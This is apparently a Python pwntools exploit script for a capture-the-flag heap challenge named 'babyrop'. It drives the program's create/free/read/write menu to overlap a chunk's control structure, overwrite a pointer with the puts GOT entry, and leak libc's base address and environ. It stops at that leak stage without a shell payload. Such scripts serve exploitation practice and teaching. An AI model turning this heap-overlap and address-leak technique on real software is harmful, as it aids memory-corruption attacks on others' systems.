from pwn import *

exe = ELF("./babyrop", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe
context.log_level = 'debug'

def create(index, length, data):
    p.sendlineafter(b'command:', b'C')
    p.sendlineafter(b'enter your index:', '{}'.format(index).encode())
    p.sendlineafter(b'How long is your safe_string:', '{}'.format(length).encode())
    p.sendafter(b'enter your string:', data)

def free(index):
    p.sendlineafter(b'command:', b'F')
    p.sendlineafter(b'enter your index:', '{}'.format(index).encode())

def read(index):
    p.sendlineafter(b'command:', b'R')
    p.sendlineafter(b'enter your index:', '{}'.format(index).encode())
    return p.recvuntil(b'enter')

def write(index, data):
    p.sendlineafter(b'command:', b'W')
    p.sendlineafter(b'index:', '{}'.format(index).encode())
    p.sendafter(b'enter your string:', data)

p = process('./babyrop')
gdb.attach(p, gdbscript='''
vis
''')

#############################
### Stage 1: Leak address ###
#############################
print('------ Stage 1: Leak address ------')
offset = 0x140
for i in range(10):
    create(i, 0x40, '{}'.format(i).encode()*8)
for i in range(10):
    free(i)
create(0, 0x420, b'0*8')

# chunk 0 control string data --> change struct of chunk 7
# leak address
write(0, flat(0x8, exe.got['puts']))
puts_leak = read(7).split(b'\n')[1].decode().split(' ')[::-1][2:-1]
puts_leak = int(''.join([i for i in puts_leak]), 16)
print('[+] Leak puts address:', hex(puts_leak))
libc.address = puts_leak - libc.sym['puts']
print('puts: ', hex(libc.address))
write(0, flat(0x8, exe.got['environ']))
print(read(7))
p.interactive()